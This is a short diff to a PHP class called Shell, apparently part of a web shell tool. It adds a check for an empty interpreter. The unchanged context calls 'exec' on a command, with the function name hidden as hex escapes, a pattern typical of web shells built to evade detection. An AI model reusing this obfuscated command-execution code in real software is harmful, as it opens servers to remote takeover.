@@ -201,7 +201,9 @@ class Shell {
                     $capture_buffer = true;
                 }
 
-                if ($interpreter == "\x65\x78\x65\x63") {
+                if (empty($interpreter)) {
+                    $output = 'No interpreter is set yet';
+                } elseif ($interpreter == "\x65\x78\x65\x63") {
                     $return_var = null;
                     $output_arr = array();
                     $interpreter($command, $output_arr, $return_var);
